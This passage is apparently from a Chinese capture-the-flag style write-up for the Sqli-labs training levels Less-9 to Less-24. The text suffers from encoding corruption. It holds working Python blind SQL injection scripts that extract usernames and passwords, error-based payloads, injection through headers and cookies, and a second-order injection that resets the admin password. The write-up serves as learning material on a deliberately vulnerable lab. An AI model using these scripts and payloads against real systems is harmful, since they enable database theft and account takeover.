class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;for i in range(1,10):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	for j in range(48,122):(test,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		payload = url + &amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(&lt;span class=&#34;hljs-built_in&#34;&gt;substr&lt;/span&gt;((&amp;#123;&amp;#125;),&amp;#123;&amp;#125;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&amp;#123;&amp;#125;,sleep(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)--+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.format(data,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		t1 = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		r = requests.get(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		t2 = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		if(t2-t1&amp;gt;=2):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			result+=chr(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			print(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;Less-10&#34;&gt;&lt;a href=&#34;#Less-10&#34; class=&#34;headerlink&#34; title=&#34;Less-10&#34;&gt;&lt;/a&gt;Less-10&lt;/h2&gt;&lt;p&gt;ç”¨&lt;code&gt;&amp;quot;&lt;/code&gt;é—­åˆ&lt;/p&gt;
&lt;h2 id=&#34;Less-11&#34;&gt;&lt;a href=&#34;#Less-11&#34; class=&#34;headerlink&#34; title=&#34;Less-11&#34;&gt;&lt;/a&gt;Less-11&lt;/h2&gt;&lt;p&gt;ç”±äºè¯·æ±‚æ–¹å¼æ˜¯postï¼Œå› æ­¤è¦ç”¨BurpSuitæŠ“åŒ…ï¼Œå¯ä»¥å‘ç°è´¦å·å¯†ç å¤„å­˜åœ¨æ³¨å…¥ç‚¹&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/8.png&#34; alt=&#34;sql&#34;&gt;&lt;br&gt;#Less-12&lt;br&gt;åŒä¸Šï¼Œç”¨&lt;code&gt;&amp;quot;)&lt;/code&gt;é—­åˆ&lt;br&gt;#Less-13&lt;br&gt;å¯ä»¥å‘ç°é¡µé¢æ²¡æœ‰å›æ˜¾ï¼Œé€šè¿‡è¿”å›å›¾ç‰‡çš„ä¸åŒå¯ä»¥å‘ç°æ˜¯boolç›²æ³¨ï¼Œè€Œä¸”æ—¶é—´ç›²æ³¨åº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ç”±äºè¿”å›çš„æ•°æ®åŒ…ä¸åŒç‚¹æ˜¯å›¾ç‰‡ä¸ç›¸åŒï¼Œä¸èƒ½é€šè¿‡åˆ¤æ–­é•¿åº¦è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œå¯ä»¥ç”¨&lt;code&gt;if(s in r.txt)&lt;/code&gt;è¿›è¡Œåˆ¤æ–­&lt;br&gt;å…ˆæ”¾ä¸€ä¸‹è„šæœ¬ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight nix&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nix&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;url&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://47.96.233.216:8080/Less-13/&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;test&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select database()&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;schema&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select schema_name from information_schema.schemata limit 0,1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;table&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select table_name from information_schema.tables where table_schema=database() limit 1,1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;column&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select column_name from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; limit 0,1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;data&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select concat_ws(0x5e,username,password) from security.users limit 0,1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;result&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;for i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;):&lt;br&gt;	for j &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;122&lt;/span&gt;):&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;payload&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;#x27;) and ascii(substr((&amp;#123;0&amp;#125;),&amp;#123;1&amp;#125;,1))=&amp;#123;2&amp;#125; #&amp;quot;&lt;/span&gt;.format(test,i,j)&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;post_r&lt;/span&gt; = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uname&amp;quot;&lt;/span&gt;:payload,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passwd&amp;quot;&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&amp;#125;&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;r&lt;/span&gt; = requests.post(url,&lt;span class=&#34;hljs-attr&#34;&gt;data=post_r)&lt;/span&gt;&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;l&lt;/span&gt; = len(r.text)&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;txt&lt;/span&gt; = r.text&lt;br&gt;		&lt;span class=&#34;hljs-attr&#34;&gt;s&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;../images/flag.jpg&amp;quot;&lt;/span&gt;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (s &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; txt):&lt;br&gt;			result+=chr(j)&lt;br&gt;			print(result)&lt;br&gt;			break&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä»¥åŠä¸€ä¸ªç½‘ä¸Šæ‰¾çš„ä¸€ä¸ªè¾ƒå¥½çš„è„šæœ¬â€˜&lt;a href=&#34;https://blog.csdn.net/vhkjhwbs/article/details/98960802%E2%80%99%EF%BC%9A&#34;&gt;https://blog.csdn.net/vhkjhwbs/article/details/98960802â€™ï¼š&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt; &lt;br&gt;chars = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;amp;%/^!~&amp;quot;&lt;/span&gt;&lt;br&gt;result = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt; &lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get_length&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;value&lt;/span&gt;):&lt;/span&gt;  &lt;span class=&#34;hljs-comment&#34;&gt;#è·å–è¦æŸ¥è¯¢çš„æ•°æ®çš„é•¿åº¦&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; n &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;):&lt;br&gt;        payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;#x27;) and length((&amp;#123;0&amp;#125;)) =&amp;#123;1&amp;#125; #&amp;quot;&lt;/span&gt;.&lt;span class=&#34;hljs-built_in&#34;&gt;format&lt;/span&gt;(data_payload,n)&lt;br&gt;        data = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uname&amp;quot;&lt;/span&gt;:payload,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passwd&amp;quot;&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&amp;#125;&lt;br&gt;        html = requests.post(url,data=data)&lt;br&gt;        length = &lt;span class=&#34;hljs-built_in&#34;&gt;len&lt;/span&gt;(html.text)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; length &amp;gt;value:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;â€¦â€¦data length is :&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-built_in&#34;&gt;str&lt;/span&gt;(n))&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;  n&lt;br&gt; &lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get_data&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;data_length,value&lt;/span&gt;):&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;#è·å–æ•°æ®&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;global&lt;/span&gt; result&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,data_length):&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; char &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; chars:&lt;br&gt;            payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;#x27;)and ascii(substr((&amp;#123;0&amp;#125;),&amp;#123;1&amp;#125;,1))=&amp;#123;2&amp;#125; #&amp;quot;&lt;/span&gt;.&lt;span class=&#34;hljs-built_in&#34;&gt;format&lt;/span&gt;(data_payload,i,&lt;span class=&#34;hljs-built_in&#34;&gt;ord&lt;/span&gt;(char))&lt;br&gt;            data = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uname&amp;quot;&lt;/span&gt;:payload,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passwd&amp;quot;&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&amp;#125;&lt;br&gt;            html = requests.post(url,data=data)&lt;br&gt;            length = &lt;span class=&#34;hljs-built_in&#34;&gt;len&lt;/span&gt;(html.text)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; length&amp;gt;value:         &lt;span class=&#34;hljs-comment&#34;&gt;#æ ¹æ®è¿”å›é•¿åº¦çš„ä¸åŒæ¥åˆ¤æ–­å­—ç¬¦æ­£ç¡®ä¸å¦&lt;/span&gt;&lt;br&gt;                result += char&lt;br&gt;                &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;â€¦â€¦ data is :&amp;quot;&lt;/span&gt;+ result)&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt; &lt;br&gt; &lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://47.96.233.216:8080/Less-13/&amp;quot;&lt;/span&gt;&lt;br&gt;data_payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select group_concat(table_name)from information_schema.tables where table_schema = database()&amp;quot;&lt;/span&gt;&lt;br&gt;value = &lt;span class=&#34;hljs-number&#34;&gt;1460&lt;/span&gt; &lt;br&gt; &lt;br&gt;length = get_length(value) +&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;get_data(length,value)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(result)&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;Less-14&#34;&gt;&lt;a href=&#34;#Less-14&#34; class=&#34;headerlink&#34; title=&#34;Less-14&#34;&gt;&lt;/a&gt;Less-14&lt;/h2&gt;&lt;p&gt;ç”¨&lt;code&gt;&amp;quot;&lt;/code&gt;é—­åˆ&lt;/p&gt;
&lt;h2 id=&#34;Less-15&#34;&gt;&lt;a href=&#34;#Less-15&#34; class=&#34;headerlink&#34; title=&#34;Less-15&#34;&gt;&lt;/a&gt;Less-15&lt;/h2&gt;&lt;p&gt;åŒç¬¬åä¸‰å…³è„šæœ¬&lt;/p&gt;
&lt;h2 id=&#34;Less-16&#34;&gt;&lt;a href=&#34;#Less-16&#34; class=&#34;headerlink&#34; title=&#34;Less-16&#34;&gt;&lt;/a&gt;Less-16&lt;/h2&gt;&lt;p&gt;ç”¨&lt;code&gt;&amp;quot;)&lt;/code&gt;é—­åˆ&lt;/p&gt;
&lt;h2 id=&#34;Less-17&#34;&gt;&lt;a href=&#34;#Less-17&#34; class=&#34;headerlink&#34; title=&#34;Less-17&#34;&gt;&lt;/a&gt;Less-17&lt;/h2&gt;&lt;p&gt;ç›²çŒœæŠ¥é”™æ³¨å…¥&lt;/p&gt;
&lt;h3 id=&#34;æ•°æ®ç±»å‹æº¢å‡º&#34;&gt;&lt;a href=&#34;#æ•°æ®ç±»å‹æº¢å‡º&#34; class=&#34;headerlink&#34; title=&#34;æ•°æ®ç±»å‹æº¢å‡º&#34;&gt;&lt;/a&gt;æ•°æ®ç±»å‹æº¢å‡º&lt;/h3&gt;&lt;p&gt;select exp(~(select*from(select user())x));   # MySQL &amp;lt; 5.5.53&lt;br&gt;pow, cot&lt;/p&gt;
&lt;h3 id=&#34;å‡ ä½•å‡½æ•°æŠ¥é”™&#34;&gt;&lt;a href=&#34;#å‡ ä½•å‡½æ•°æŠ¥é”™&#34; class=&#34;headerlink&#34; title=&#34;å‡ ä½•å‡½æ•°æŠ¥é”™&#34;&gt;&lt;/a&gt;å‡ ä½•å‡½æ•°æŠ¥é”™&lt;/h3&gt;&lt;p&gt;select multipoint((select * from (select * from (select version())a)b)); # ä½ç‰ˆæœ¬&lt;br&gt;geometrycollection multipoint polygon multipolygon linestring multilinestringç­‰&lt;/p&gt;
&lt;h3 id=&#34;Xpathè¯­æ³•é”™è¯¯&#34;&gt;&lt;a href=&#34;#Xpathè¯­æ³•é”™è¯¯&#34; class=&#34;headerlink&#34; title=&#34;Xpathè¯­æ³•é”™è¯¯&#34;&gt;&lt;/a&gt;Xpathè¯­æ³•é”™è¯¯&lt;/h3&gt;&lt;p&gt;select updatexml(1,concat(0x3a,(select @@version),0x3a),1) # MySQL &amp;gt; 5.1&lt;br&gt;select extractvalue(1,concat(0x3a,(select @@version),0x3a))&lt;/p&gt;
&lt;p&gt;å¦å¤–å½“concatè¢«è¿‡æ»¤æ—¶å¯ä»¥&lt;br&gt;updatexml(1,make_set(3,â€™â€™,(select version())),1)&lt;/p&gt;
&lt;h3 id=&#34;æŠ¥é”™æ³¨å…¥çš„å‡ ç§å‡½æ•°åŠå…¶ç”¨æ³•ï¼š&#34;&gt;&lt;a href=&#34;#æŠ¥é”™æ³¨å…¥çš„å‡ ç§å‡½æ•°åŠå…¶ç”¨æ³•ï¼š&#34; class=&#34;headerlink&#34; title=&#34;æŠ¥é”™æ³¨å…¥çš„å‡ ç§å‡½æ•°åŠå…¶ç”¨æ³•ï¼š&#34;&gt;&lt;/a&gt;æŠ¥é”™æ³¨å…¥çš„å‡ ç§å‡½æ•°åŠå…¶ç”¨æ³•ï¼š&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;floor():&lt;code&gt;select count(*) from infromation_schema.tables group by concat((select database()),floor(rand(0)*2));&lt;/code&gt;group by å¯¹rand()å‡½æ•°è¿›è¡Œæ“ä½œæ—¶äº§ç”Ÿé”™è¯¯&lt;/li&gt;
&lt;li&gt;extractvalue():&lt;code&gt;extractualue(1,concat(0x7e,(select database()),0x7e));&lt;/code&gt;XPATHè¯­æ³•é”™è¯¯æŠ¥é”™&lt;/li&gt;
&lt;li&gt;updatexml():&lt;code&gt;select updatexml(1,concat(0x7e,(select database()),0x7e),1);&lt;/code&gt;XPATHè¯­æ³•é”™è¯¯æŠ¥é”™&lt;/li&gt;
&lt;li&gt;MYSQL5.7æ–°å¢ï¼š&lt;code&gt;select gtid_subset((select @@version), 2);&lt;/code&gt;&lt;br&gt;åœ¨passwdå¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼š&lt;br&gt;payloadï¼š&lt;code&gt;11111&amp;#39; or updatexml(1,concat(0x7e,(select database()),0x7e),321)--+&lt;/code&gt;&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/9.png&#34; alt=&#34;sql&#34;&gt;&lt;h2 id=&#34;Less-18&#34;&gt;&lt;a href=&#34;#Less-18&#34; class=&#34;headerlink&#34; title=&#34;Less-18&#34;&gt;&lt;/a&gt;Less-18&lt;/h2&gt;å¯ä»¥çŒœæµ‹UAå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹&lt;br&gt;æ„é€ UA&lt;code&gt;&amp;#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &amp;#39;1&amp;#39;=&amp;#39;1&lt;/code&gt;&lt;h2 id=&#34;Less-19&#34;&gt;&lt;a href=&#34;#Less-19&#34; class=&#34;headerlink&#34; title=&#34;Less-19&#34;&gt;&lt;/a&gt;Less-19&lt;/h2&gt;refferå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå…¶ä½™åŒä¸Š&lt;h2 id=&#34;Less-20&#34;&gt;&lt;a href=&#34;#Less-20&#34; class=&#34;headerlink&#34; title=&#34;Less-20&#34;&gt;&lt;/a&gt;Less-20&lt;/h2&gt;æ‰“å¼€æç¤ºcookieï¼Œé‚£å°±å…ˆæŠ“ä¸ªåŒ…ï¼Œæ„é€ cookie&lt;code&gt;uname=admin&amp;#39;&lt;/code&gt;å‘ç°æŠ¥é”™ï¼Œå¯çŸ¥å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå…¶ä½™å°±æ˜¯æ­£å¸¸æ­¥éª¤ï¼Œå…ˆåˆ¤æ–­åˆ—æ•°ï¼Œå¯ä»¥å‘ç°æ˜¯3ã€‚ã€‚ã€‚ã€‚&lt;h2 id=&#34;Less-21&#34;&gt;&lt;a href=&#34;#Less-21&#34; class=&#34;headerlink&#34; title=&#34;Less-21&#34;&gt;&lt;/a&gt;Less-21&lt;/h2&gt;ç”¨&lt;code&gt;&amp;#39;)&lt;/code&gt;é—­åˆï¼Œå¹¶ä¸”æ˜¯è¦ç»è¿‡base64ç¼–ç ï¼Œå…¶ä½™åŒä¸Š&lt;h2 id=&#34;Less-22&#34;&gt;&lt;a href=&#34;#Less-22&#34; class=&#34;headerlink&#34; title=&#34;Less-22&#34;&gt;&lt;/a&gt;Less-22&lt;/h2&gt;ç”¨&lt;code&gt;&amp;quot;&lt;/code&gt;é—­åˆ&lt;h2 id=&#34;Less-23&#34;&gt;&lt;a href=&#34;#Less-23&#34; class=&#34;headerlink&#34; title=&#34;Less-23&#34;&gt;&lt;/a&gt;Less-23&lt;/h2&gt;&lt;code&gt;#&lt;/code&gt;ä»¥åŠ&lt;code&gt;--&lt;/code&gt;è¢«è¿‡æ»¤&lt;br&gt;é‚£å°±ç”¨&lt;code&gt;or &amp;#39;1&amp;#39;=&amp;#39;1&lt;/code&gt;æ¥é—­åˆå¤šä½™å‡ºæ¥çš„å•å¼•å·&lt;h2 id=&#34;Less-24&#34;&gt;&lt;a href=&#34;#Less-24&#34; class=&#34;headerlink&#34; title=&#34;Less-24&#34;&gt;&lt;/a&gt;Less-24&lt;/h2&gt;äºŒæ¬¡æ³¨å…¥&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/10.png&#34; alt=&#34;sql&#34;&gt;&lt;br&gt;å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º&lt;code&gt;admin&amp;#39; #&lt;/code&gt;çš„è´¦å·ï¼Œè™½ç„¶æ³¨å†Œæ—¶ä¼šè¢«è½¬ä¹‰ï¼Œä½†æ˜¯æ•°æ®è¿˜æ˜¯ä¼šè¢«å­˜å…¥æ•°æ®åº“ï¼Œæ‰€ä»¥åœ¨æ¥ä¸‹æ¥å…¶ä»–åœ°æ–¹è¢«è°ƒç”¨æ—¶å°±ä¼šå‡ºç°æ¼æ´ï¼Œå³åœ¨æ”¹å¯†ç æ—¶ï¼ŒSQLè¯­å¥æ‹¼æ¥å‡º&lt;code&gt;&amp;quot;UPDATE users SET PASSWORD=&amp;#39;$pass&amp;#39; where username=&amp;#39;admin&amp;#39; #&amp;#39; and password=&amp;#39;$curr_pass&amp;#39; &amp;quot;&lt;/code&gt;ï¼Œå°±å¯ä»¥ä¿®æ”¹adminçš„å¯†ç ï¼Œå®ç°SQLæ³¨å…¥&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/11.png&#34; 